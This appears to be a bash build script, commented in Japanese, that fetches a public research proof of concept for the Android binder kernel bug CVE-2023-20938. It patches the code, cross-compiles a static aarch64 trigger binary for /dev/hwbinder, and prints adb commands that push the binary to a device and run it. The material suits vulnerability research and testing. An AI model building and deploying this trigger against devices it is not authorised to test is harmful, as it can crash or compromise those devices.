#!/usr/bin/env bash
# =====================================================================
# CVE-2023-20938 トリガ PoC を aarch64 (Android 向け静的バイナリ) にビルドする
#
#  元ネタ: 0xAtharv/CVE-2023-20938-Public (バグトリガ, 研究目的)
#  使い方:  bash tools/build_trigger_poc.sh [出力ディレクトリ]
#
#  コンパイラ:
#    - zig (推奨, pip install --break-system-packages ziglang で入る)
#    - または NDK / aarch64-linux-gnu-gcc / Termux の clang を CC= で指定
# =====================================================================
set -euo pipefail

OUT_DIR="${1:-$PWD/artifacts}"
WORK="${WORK:-/tmp/p710poc}"
mkdir -p "$OUT_DIR" "$WORK"

if [ ! -d "$WORK/CVE-2023-20938-Public/.git" ]; then
  git clone --depth 1 https://github.com/0xAtharv/CVE-2023-20938-Public.git "$WORK/CVE-2023-20938-Public"
fi
cd "$WORK/CVE-2023-20938-Public"
git fetch --depth 1 origin >/dev/null 2>&1 || true

# --- 修正1: binder_enter_looper の宣言/定義衝突 (binder.c と binder_client.c で別物) を回避 ---
sed -i 's/int binder_enter_looper(int fd);/int binder_client_enter_looper(int fd);/' include/binder_client.h
sed -i 's/^int binder_enter_looper(int fd) {/int binder_client_enter_looper(int fd) {/' src/binder_client.c

SRC="src/main.c src/binder.c src/buf.c src/transaction.c src/binder_lookup.c src/log.c"
COMMON_FLAGS="-O2 -static -Iinclude -DBINDER_DEVICE=\"/dev/hwbinder\" -Wno-int-conversion -Wno-incompatible-pointer-types -Wno-format"

build_with_zig() {
  python3 -m ziglang cc -target aarch64-linux-musl $COMMON_FLAGS $SRC \
      -o "$OUT_DIR/trigger_hwbinder"
}

build_with_cc() {
  ${CC:-aarch64-linux-gnu-gcc} $COMMON_FLAGS $SRC -o "$OUT_DIR/trigger_hwbinder"
}

if [ -n "${CC:-}" ]; then
  echo "[*] CC=$CC でビルド"
  build_with_cc
elif command -v aarch64-linux-gnu-gcc >/dev/null 2>&1; then
  echo "[*] aarch64-linux-gnu-gcc でビルド"
  build_with_cc
elif python3 -c "import ziglang" 2>/dev/null; then
  echo "[*] zig でビルド"
  build_with_zig
else
  cat <<'EOM'
[!] aarch64 クロスコンパイラが見つかりません。次のいずれかを用意してください:
      pip3 install --break-system-packages ziglang     # zig を Python パッケージで導入
      apt install gcc-aarch64-linux-gnu                # Debian/Ubuntu
    あるいは Android NDK の clang を CC= で指定。
EOM
  exit 1
fi

file "$OUT_DIR/trigger_hwbinder" 2>/dev/null || true
ls -l "$OUT_DIR/trigger_hwbinder"
echo
echo "[*] 端末への投入:"
echo "    adb push $OUT_DIR/trigger_hwbinder /data/local/tmp/"
echo "    adb shell chmod 755 /data/local/tmp/trigger_hwbinder"
echo "    adb shell /data/local/tmp/trigger_hwbinder"
